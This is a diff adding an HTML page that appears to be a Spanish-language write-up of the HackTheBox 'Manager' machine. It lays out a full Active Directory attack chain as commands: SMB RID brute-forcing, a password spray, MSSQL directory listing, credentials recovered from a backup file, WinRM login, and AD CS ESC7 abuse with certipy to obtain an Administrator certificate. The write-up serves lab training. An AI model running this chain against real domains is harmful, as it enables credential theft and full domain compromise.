@@ -1,0 +1,135 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Manager HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/active-directory.html">~/writeups/active-directory</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/manager/pasted-image-20260302171801.png" alt="Manager HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Active Directory</p>
+          <h1>Manager</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>MSSQL</span>
+            <span>AD CS</span>
+            <span>Certipy</span>
+            <span>WinRM</span>
+            <span>esc</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: SMB anónimo (usuarios) y password spray</li>
+            <li><code>Explotación</code>: Enumerar <code>MSSQL</code></li>
+            <li><code>Escalada de Privilegios</code>: Certificados <code>AD CS</code> mediante <code>ESC7</code></li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/manager/pasted-image-20260302204247.png" alt="Manager HTB" />
+          <div class="code-card">
+            <h3>Enumerar usuarios --rid-brute</h3>
+            <pre><code>nxc smb 10.129.14.104 -u &#x27;Guest&#x27; -p &#x27;&#x27; --rid-brute
+# Poner usuarios en minúscula para el password spray</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: MSSQL</h2>
+          <div class="code-card">
+            <h3>Password Spray</h3>
+            <pre><code>nxc smb 10.129.14.104 -u users -p users --rid-brute
+# Credenciales -&gt; operator:operator</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Acceso MSSQL</h3>
+            <pre><code>nxc mssql 10.129.14.104 -u operator -p operator
+impacket-mssqlclient manager.htb/operator@10.129.14.104 -windows-auth</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>MSSLQ: Leer directorio de la web IIS</h3>
+            <pre><code># Intentamos habilitar enable_xp_cmdshell
+xp_dirtree C:\inetpub\wwwroot\</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/manager/pasted-image-20260302220051.png" alt="Manager HTB" />
+          <div class="code-card">
+            <h3>Descargar fichero.zip</h3>
+            <pre><code>wget http://manager.htb/website-backup-27-07-23-old.zip
+unzip website-backup-27-07-23-old.zip
+ls -a
+# Hay un fichero oculto</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/manager/pasted-image-20260302220329.png" alt="Manager HTB" />
+          <div class="code-card">
+            <h3>Leer fichero oculto y acceso WinRM</h3>
+            <pre><code>bat .old-conf.xml
+# Credenciales -&gt;  raven:R4v3nBe5tD3veloP3r!123
+evil-winrm -i manager.htb -u raven -p &#x27;R4v3nBe5tD3veloP3r!123&#x27;</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/manager/pasted-image-20260302220413.png" alt="Manager HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: AD CS ESC-7</h2>
+          <div class="code-card">
+            <h3>Enumerar AD CS vulnerables</h3>
+            <pre><code>certipy-ad find -u &#x27;raven&#x27; -p &#x27;R4v3nBe5tD3veloP3r!123&#x27; -dc-ip 10.129.14.104 -vulnerable</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/manager/pasted-image-20260302220751.png" alt="Manager HTB" />
+          <div class="code-card">
+            <h3>Agregar el rol Certificate Officer al propio usuario</h3>
+            <pre><code>certipy-ad ca -u raven@manager.htb -p &#x27;R4v3nBe5tD3veloP3r!123&#x27; -ns 10.129.14.104 -target dc01.manager.htb -ca &#x27;&#x27;manager-DC01-CA&#x27;&#x27; -add-officer raven
+# Successfully added officer &#x27;Raven&#x27; on &#x27;&#x27;manager-DC01-CA&#x27;&#x27;</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Habilitar plantilla SubCA</h3>
+            <pre><code>certipy-ad ca -u raven@manager.htb -p &#x27;R4v3nBe5tD3veloP3r!123&#x27; -ns 10.129.14.104 -target dc01.manager.htb -ca &#x27;manager-DC01-CA&#x27; -enable-template &#x27;SubCA&#x27;
+# [*] Successfully enabled &#x27;SubCA&#x27; on &#x27;&#x27;manager-DC01-CA&#x27;&#x27;</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Solicitar certificado para Administrator, si falla se crea una.key con un id</h3>
+            <pre><code>certipy-ad req -u raven@manager.htb -p &#x27;R4v3nBe5tD3veloP3r!123&#x27; -dc-ip 10.129.14.104 -target dc01.manager.htb -ca &#x27;manager-DC01-CA&#x27; -template &#x27;SubCA&#x27; -upn administrator@manager.htb
+# Guardar Request ID como &lt;id&gt;.key</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/manager/pasted-image-20260302231400.png" alt="Manager HTB" />
+          <div class="code-card">
+            <h3>Aprobar la solicitud anterior a través de la &lt;id&gt;.key</h3>
+            <pre><code>certipy-ad ca -u raven@manager.htb -p &#x27;R4v3nBe5tD3veloP3r!123&#x27; -ns 10.129.14.104 -target dc01.manager.htb -ca &#x27;manager-DC01-CA&#x27; -issue-request 19
+# [*] Successfully issued certificate request ID 19</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Recuperar el certificado de Administrator</h3>
+            <pre><code>certipy-ad req -u raven@manager.htb -p &#x27;R4v3nBe5tD3veloP3r!123&#x27; -dc-ip 10.129.14.104 -target dc01.manager.htb -ca &#x27;manager-DC01-CA&#x27; -retrieve 19</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/manager/pasted-image-20260302231459.png" alt="Manager HTB" />
+          <div class="code-card">
+            <h3>Autenticarse con el Certificado.pfx</h3>
+            <pre><code>certipy-ad auth -pfx administrator.pfx -domain manager.htb -dc-ip 10.129.14.104</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/manager/pasted-image-20260302232722.png" alt="Manager HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>MSSQL</span>
+            <span>AD CS</span>
+            <span>Certipy</span>
+            <span>WinRM</span>
+            <span>esc</span>
+            <span>ad_cs</span>
+            <span>esc7</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
